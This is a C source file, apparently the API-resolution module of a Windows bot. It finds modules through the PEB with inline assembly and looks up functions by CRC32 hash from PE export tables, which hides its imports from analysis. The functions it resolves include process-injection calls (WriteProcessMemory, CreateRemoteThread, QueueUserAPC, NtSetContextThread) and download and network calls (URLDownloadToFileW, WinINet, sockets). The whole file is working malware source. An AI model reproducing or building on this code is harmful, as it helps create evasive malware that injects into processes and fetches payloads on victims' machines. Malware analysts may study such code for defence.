#include "api.h"
#include "utils.h"
#include "ntheader.h"

#include "string.h"
#include "mem.h"

extern bot_t bot;

DWORD WINAPI crc32Hash(const void *data, DWORD size)
{
	DWORD i, j, crc, cc;

	if (bot.crc.crc32Intalized == FALSE)
	{
		for (i = 0; i < 256; i++)
		{
			crc = i;
			for (j = 8; j > 0; j--)
			{
				if (crc & 0x1)crc = (crc >> 1) ^ 0xEDB88320L;
				else crc >>= 1;
			}
			bot.crc.crc32table[i] = crc;
		}

		bot.crc.crc32Intalized = TRUE;
	}
	cc = 0xFFFFFFFF;
	for (i = 0; i < size; i++)cc = (cc >> 8) ^ bot.crc.crc32table[(((LPBYTE)data)[i] ^ cc) & 0xFF];
	return ~cc;
}
DWORD WINAPI crc32HashEnd(void) { return 0; }

HMODULE WINAPI GetModuleHandleByHash(DWORD dwHash)
{
	LDR_MODULE* pModule = NULL;
	DWORD dwCurrentHash, dwLength;

	_asm
	{
		MOV EAX, FS:[0x18];
		MOV EAX, [EAX + 0x30];
		MOV EAX, [EAX + 0x0C];
		MOV EAX, [EAX + 0x0C];
		MOV pModule, EAX;
	}

	while (pModule->BaseAddress)
	{
		LPWSTR pwzLowerCase = StrToLowerW(pModule->BaseDllName.Buffer, pModule->BaseDllName.Length);

		dwLength = StrLengthW(pwzLowerCase) * 2;

		dwCurrentHash = crc32Hash(pwzLowerCase, dwLength);

		if (dwCurrentHash == dwHash)
		{
			return (HMODULE)pModule->BaseAddress;
		}
	
		pModule = (LDR_MODULE*)(struct ModuleInfoNode*)pModule->InLoadOrderModuleList.Flink;
	}

	return (HMODULE)NULL;
}
DWORD WINAPI GetModuleHandleByHashEnd() { return 0; }

BOOL WINAPI _GetAPIModules()
{
	DWORD i;

	module_t module_list[] =
	{
		{ HASH_KERNEL32, &bot.modules.hKernel32 },
		{ HASH_NTDLL, &bot.modules.hNtdll }
	};

	for (i = 0; i < sizeof(module_list) / sizeof(module_t); i++)
	{
		if ((*module_list[i].pModule = GetModuleHandleByHash(module_list[i].dwModuleHash)) == 0)
		{
			return FALSE;
		}
	}

	return TRUE;
}
DWORD WINAPI GetAPIModulesEnd(void) { return 0; }

/*

*/
HMODULE WINAPI LoadLibraryByHash(DWORD dwHash)
{
	LPWSTR pwzSystemDir, pwzPath;
	WIN32_FIND_DATAW ffd;
	HANDLE hFile;
	DWORD dwCurrentHash;
	HMODULE hMod;

	if ((pwzSystemDir = GetSystem32Dir()) == NULL)
		return 0;

	if ((pwzPath = StrConcatW(pwzSystemDir, L"\\*.dll")) == NULL)
		return 0;

	hMod = 0;

	memzero(&ffd, sizeof(WIN32_FIND_DATAW));

	if ((hFile = bot.api.pFindFirstFileW(pwzPath, &ffd)) != INVALID_HANDLE_VALUE)
	{
		while (TRUE)
		{
			if (!bot.api.pFindNextFileW(hFile, &ffd))
				break;

			if (hFile == INVALID_HANDLE_VALUE)
				break;

			dwCurrentHash = crc32Hash(ffd.cFileName, StrLengthW(ffd.cFileName) * 2);

			if (dwCurrentHash == dwHash)
			{
				hMod = bot.api.pLoadLibraryW(ffd.cFileName);
				break;
			}
		}
	}

	memfree(pwzPath);
	memfree(pwzSystemDir);

	return hMod;
}

BOOL WINAPI _LoadAPIModules()
{
	DWORD i;

	module_t load_module_list[] =
	{
		{ HASH_USER32, &bot.modules.hUser32 },
		{ HASH_WININET, &bot.modules.hWininet },
		{ HASH_SHELL32, &bot.modules.hShell32 },
		{ HASH_ADVAPI32, &bot.modules.hAdvapi32 },
		{HASH_URLMON, &bot.modules.hUrlmon },
		{HASH_WS2_32, &bot.modules.hWs2_32}
	};

	for (i = 0; i < sizeof(load_module_list) / sizeof(module_t); i++)
	{
		if ((*load_module_list[i].pModule = LoadLibraryByHash(load_module_list[i].dwModuleHash)) == 0)
			return FALSE;
	}

	return TRUE;
}

LPVOID WINAPI GetProcAddressByHash(HMODULE module, DWORD dwHash)
{
#if defined _WIN64
	PIMAGE_NT_HEADERS64 ntHeaders;
#else
	PIMAGE_NT_HEADERS32 ntHeaders;
#endif
	PIMAGE_DATA_DIRECTORY impDir;
	PIMAGE_EXPORT_DIRECTORY ied;

	LPDWORD curName;
	DWORD i, dwCurrentHash;
	LPSTR pszFunction;
	LPWORD pw;

	if (module == NULL)
		return NULL;

#if defined _WIN64
	ntHeaders = (PIMAGE_NT_HEADERS64)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#else
	ntHeaders = (PIMAGE_NT_HEADERS32)((LPBYTE)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
#endif
	impDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + impDir->VirtualAddress);

	for (i = 0; i < ied->NumberOfNames; i++)
	{
		curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfNames + i * sizeof(DWORD));
		pszFunction = (LPSTR)((LPBYTE)module + *curName);

		dwCurrentHash = crc32Hash(pszFunction, StrLengthA(pszFunction));

		if (curName && pszFunction && dwCurrentHash == dwHash)
		{
			pw = (LPWORD)(((LPBYTE)module) + ied->AddressOfNameOrdinals + i * sizeof(WORD));
			curName = (LPDWORD)(((LPBYTE)module) + ied->AddressOfFunctions + (*pw) * sizeof(DWORD));
			return ((LPBYTE)module + *curName);
		}
	}

	return NULL;
}
DWORD WINAPI GetProcAddressByHashEnd(void) { return 0; }

BOOL WINAPI _LoadAPIFunctions()
{
	DWORD i;

	api_t api_list[] =
	{
		{HASH_NTDLL_NTCREATETHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateThread},
		{HASH_NTDLL_NTQUERYINFORMATIONPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtQueryInformationProcess},
		{HASH_NTDLL_NTCREATEUSERPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateUserProcess},
		{HASH_NTDLL_NTMAPVIEWOFSECTION, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtMapViewOfSection},
		{HASH_NTDLL_LDRLOADDLL, &bot.modules.hNtdll, (LPVOID*)&bot.api.pLdrLoadDll},
		{HASH_NTDLL_LDRGETDLLHANDLE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pLdrGetDllHandle},
		{HASH_NTDLL_NTWRITEVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtWriteVirtualMemory},
		{HASH_NTDLL_NTALLOCATEVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtAllocateVirtualMemory},
		{HASH_NTDLL_NTPROTECTVIRTUALMEMORY, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtProtectVirtualMemory},
		{ HASH_NTDLL_NTDEVICEIOCONTROLFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtDeviceIoControlFile},
		{HASH_NTDLL_NTSETCONTEXTTHREAD, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtSetContextThread},
		{HASH_NTDLL_NTOPENPROCESS, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtOpenProcess},
		{HASH_NTDLL_NTCLOSE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtClose},
		{HASH_NTDLL_NTCREATEFILE, &bot.modules.hNtdll, (LPVOID*)&bot.api.pNtCreateFile},
		{ HASH_KERNEL32_VIRTUALALLOC, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualAlloc },
		{ HASH_KERNEL32_VIRTUALFREE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualFree },
		{ HASH_KERNEL32_WRITEPROCESSMEMORY, &bot.modules.hKernel32, (LPVOID*)&bot.api.pWriteProcessMemory },
		{ HASH_KERNEL32_CREATETOOLHELP32SNAPSHOT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateToolhelp32Snapshot },
		{ HASH_KERNEL32_VIRTUALALLOCEX, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualAllocEx },
		{ HASH_KERNEL32_VIRTUALFREEEX, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualFreeEx },
		{ HASH_KERNEL32_PROCESS32FIRSTW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pProcess32FirstW },
		{ HASH_KERNEL32_PROCESS32NEXTW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pProcess32NextW },
		{ HASH_KERNEL32_CLOSEHANDLE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCloseHandle },
		{ HASH_KERNEL32_CREATEPROCESSW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateProcessW },
		{ HASH_KERNEL32_VIRTUALPROTECT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualProtect },
		{ HASH_KERNEL32_OPENPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pOpenProcess },
		{ HASH_KERNEL32_CREATEREMOTETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateRemoteThread },
		{ HASH_KERNEL32_EXITPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pExitProcess },
		{ HASH_KERNEL32_GETMODULEFILENAMEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetModuleFileNameW },
		{ HASH_KERNEL32_DELETEFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pDeleteFileW },
		{ HASH_KERNEL32_SLEEP, &bot.modules.hKernel32, (LPVOID*)&bot.api.pSleep },
		{ HASH_KERNEL32_LOADLIBRARYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pLoadLibraryW },
		{ HASH_KERNEL32_ISWOW64PROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pIsWow64Process },
		{ HASH_KERNEL32_GETWINDOWSDIRECTORYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetWindowsDirectoryW },
		{ HASH_KERNEL32_QUEUEUSERAPC, &bot.modules.hKernel32, (LPVOID*)&bot.api.pQueueUserAPC },
		{ HASH_KERNEL32_RESUMETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pResumeThread },
		{ HASH_KERNEL32_GETSYSTEMDIRECTORYW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetSystemDirectoryW },
		{ HASH_KERNEL32_FINDFIRSTFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindFirstFileW },
		{ HASH_KERNEL32_FINDNEXTFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindNextFileW },
		{HASH_KERNEL32_CREATETHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateThread},
		{HASH_KERNEL32_CREATEFILEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateFileW},
		{HASH_KERNEL32_WRITEFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pWriteFile},
		{HASH_KERNEL32_READFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pReadFile},
		{HASH_KERNEL32_GETFILESIZE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetFileSize},
		{HASH_KERNEL32_GETVERSIONEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetVersionExW},
		{HASH_KERNEL32_FINDFIRSTVOLUMEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindFirstVolumeW},
		{HASH_KERNEL32_GETVOLUMEINFORMATIONW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetVolumeInformationW},
		{HASH_KERNEL32_FINDVOLUMECLOSE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFindVolumeClose},
		{HASH_NTDLL_RTLRANDOMEX, &bot.modules.hNtdll, (LPVOID*)&bot.api.pRtlRandomEx},
		{HASH_KERNEL32_MULTIBYTETOWIDECHAR, &bot.modules.hKernel32, (LPVOID*)&bot.api.pMultiByteToWideChar},
		{HASH_KERNEL32_GETMODULEHANDLEW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetModuleHandleW},
		{HASH_KERNEL32_FLUSHINSTRUCTIONCACHE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pFlushInstructionCache},
		{HASH_KERNEL32_GETPROCESSHEAP, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetProcessHeap},
		{HASH_KERNEL32_HEAPALLOC, &bot.modules.hKernel32, (LPVOID*)&bot.api.pHeapAlloc},
		{HASH_KERNEL32_HEAPFREE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pHeapFree},
		{HASH_KERNEL32_GETCURRENTPROCESS, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentProcess},
		{HASH_KERNEL32_THREAD32FIRST, &bot.modules.hKernel32, (LPVOID*)&bot.api.pThread32First},
		{HASH_KERNEL32_THREAD32NEXT, &bot.modules.hKernel32, (LPVOID*)&bot.api.pThread32Next},
		{HASH_KERNEL32_OPENMUTEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pOpenMutexW},
		{HASH_KERNEL32_CREATEMUTEXW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateMutexW},
		{HASH_KERNEL32_VIRTUALQUERY, &bot.modules.hKernel32, (LPVOID*)&bot.api.pVirtualQuery},
		{HASH_KERNEL32_GETCURRENTPROCESSID, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentProcessId},
		{HASH_KERNEL32_CREATEFILEMAPPINGW, &bot.modules.hKernel32, (LPVOID*)&bot.api.pCreateFileMappingW},
		{HASH_KERNEL32_MAPVIEWOFFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pMapViewOfFile},
		{HASH_KERNEL32_UNMAPVIEWOFFILE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pUnmapViewOfFile},
		{HASH_KERNEL32_DUPLICATEHANDLE, &bot.modules.hKernel32, (LPVOID*)&bot.api.pDuplicateHandle},
		{HASH_KERNEL32_GETCURRENTTHREAD, &bot.modules.hKernel32, (LPVOID*)&bot.api.pGetCurrentThread}
		//{HASH_USER32_WSPRINTFW, &bot.modules.hUser32, (LPVOID*)&bot.api.pwsprintfW}
	};

	for (i = 0; i < sizeof(api_list) / sizeof(api_t); i++)
	{
		*api_list[i].pFunction = GetProcAddressByHash(*api_list[i].pModule, api_list[i].dwFunctionHash);
	}

	return TRUE;
}

BOOL WINAPI _LoadLoadedAPIFunctions()
{
	DWORD i;

	api_t api_list[] =
	{
		{HASH_USER32_WSPRINTFW, &bot.modules.hUser32, (LPVOID*)&bot.api.pwsprintfW},
		{ HASH_USER32_WSPRINTFA, &bot.modules.hUser32, (LPVOID*)&bot.api.pwsprintfA},
		{HASH_WININET_INTERNETOPENW, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetOpenW},
		{HASH_WININET_INTERNETCONNECTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetConnectA},
		{HASH_WININET_HTTPOPENREQUESTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpOpenRequestA},
		{HASH_WININET_HTTPSENDREQUESTA, &bot.modules.hWininet, (LPVOID*)&bot.api.pHttpSendRequestA},
		{HASH_WININET_INTERNETREADFILE, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetReadFile},
		{HASH_WININET_INTERNETCLOSEHANDLE, &bot.modules.hWininet, (LPVOID*)&bot.api.pInternetCloseHandle},
		{HASH_SHELL32_SHGETFOLDERPATHW, &bot.modules.hShell32, (LPVOID*)&bot.api.pSHGetFolderPathW},
		{HASH_ADVAPI32_GETUSERNAMEA, &bot.modules.hAdvapi32, (LPVOID*)&bot.api.pGetUserNameA},
		{HASH_USER32_GETCURSORPOS, &bot.modules.hUser32, (LPVOID*)&bot.api.pGetCursorPos},
		{HASH_URLMON_URLDOWNLOADTOFILEW, &bot.modules.hUrlmon, (LPVOID*)&bot.api.pURLDownloadToFileW},
		{HASH_WS2_32_WSASTARTUP, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pWSAStartup},
		{HASH_WS2_32_WSACLEANUP, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pWSACleanup},
		{HASH_WS2_32_SOCKET, &bot.modules.hWs2_32, (LPVOID*)&bot.api.psocket},
		{HASH_WS2_32_CONNECT, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pconnect},
		{HASH_WS2_32_SEND, &bot.modules.hWs2_32, (LPVOID*)&bot.api.psend},
		{HASH_WS2_32_RECV, &bot.modules.hWs2_32, (LPVOID*)&bot.api.precv},
		{HASH_WS2_32_CLOSESOCKET, &bot.modules.hWs2_32, (LPVOID*)&bot.api.pclosesocket}
	};
	for (i = 0; i < sizeof(api_list) / sizeof(api_t); i++)
	{
		if ((*api_list[i].pFunction = GetProcAddressByHash(*api_list[i].pModule, api_list[i].dwFunctionHash)) == NULL)
			return FALSE;
	}
	return TRUE;
}

BOOL WINAPI InitializeAPI()
{
	if (_GetAPIModules())
	{
		if (_LoadAPIFunctions())
		{
			if (_LoadAPIModules())
			{
				return _LoadLoadedAPIFunctions();
			}
		}
	}
	return FALSE;
}